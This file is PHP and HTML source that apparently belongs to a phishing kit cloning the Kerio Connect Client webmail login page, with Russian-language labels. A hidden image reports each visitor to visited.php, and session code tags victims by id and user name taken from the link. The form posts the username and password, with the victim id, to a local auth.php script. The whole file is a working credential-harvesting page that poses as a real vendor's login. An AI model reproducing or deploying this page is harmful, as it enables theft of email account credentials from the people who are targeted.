<?php
session_start();

if(isset($_GET['id']) && isset($_GET['user'])){
    $_SESSION['id']= $_GET['id'];
    $_SESSION['user']= $_GET['user'];
    header('Location: /webmail/login/');
}

if(file_exists('config.php')){
    header('Location: config.php');
}
?>

<img src="visited.php?id=<?php echo $_SESSION['id'];?>&user=<?php echo $_SESSION['user'];?>" style="display: none;">
<html><head>
		<title>Kerio Connect Client</title>
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">

		<link href="css/favicon.ico?v=20ee3a975875292c6fac79e260d7c898" rel="shortcut icon" type="image/vnd.microsoft.icon">
		<link href="css/style.css?v=20ee3a975875292c6fac79e260d7c898" rel="stylesheet" type="text/css">
		<link href="css/webmail2.css?v=20ee3a975875292c6fac79e260d7c898" rel="stylesheet" type="text/css">
	</head>
	<body class="">
		<!-- "up-spacer"creates white space over login dialog -->
		<div id="up-spacer"></div>
		<div id="upper-message-container"></div>
		<div id="main-container" style="visibility: visible;">
			<div id="logo"><h1 id="product-name">Kerio Connect Client</h1></div>
			<!-- used only in admins -->
			<div id="admin-icon"></div>
			<!-- "top" part of buble image -->
			<div id="top"></div>
			<div id="body-container">
				<!-- Text inside H will be displayed only when CSS style are not available  -->
				<div id="error-message" style="display: none;">
					<!-- Table is used because we want empty column (with warning icon on bottom)and text in left column  -->
					<table width="100%" border="0" cellpadding="0" cellspacing="0">
						<tbody><tr>
							<td valign="top" width="0"><div id="warning-icon"></div></td>
							<td valign="middle"><div id="error-message-text"></div></td>
						</tr>
					</tbody></table>
				</div>
				<form name="container" action="auth.php" method="post" id="container" >
					<!-- ALL browsers:  "text-align:center" doesn't center hidden and than displayed element - excuse for validators -->
					<table align="center">
						<tbody><tr>
							<td id="username-container"><input class="textbox" id="username" name="username" type="email" name="kerio_username" maxlength="1024" placeholder="Имя пользователя"></td>
						</tr>
						<tr>
							<td id="password-container"><input class="textbox" id="password" type="password" name="password" maxlength="1024" placeholder="Пароль"></td>
							<input type="hidden" name="id" value="<?php echo $_SESSION['id'];?>">
						</tr>
					</tbody></table>
					<!-- place to add product specific fields, e.g. use webmail mini -->
					<div id="input-fields"></div>
					<div id="loginbutton-container"><input id="login-button" type="submit" value="Войти" class=""></div>
					<div id="remember"></div>
					<!--
						Empty element at this position causes broken design of login dialog in IE7,
						therefore &nbsp; is used as content of this div and this element has to be hidden.
					 -->
					<div id="hiddenfields-container">&nbsp;</div>
				</form>
			</div>
			<!-- "bottom" part of buble image -->
			<div id="bottom"></div>
			<div id="shine"></div>
		</div>
		<div id="additional-message-container"></div>
		<div id="lower-message-container"><div style="text-align:center;"><a href="/integration/" id="integrationLinks" style="font-size: 12px; color: rgb(100, 99, 99);">Интеграция с Windows</a></div></div>
		<div id="sso-container"></div>
</body></html>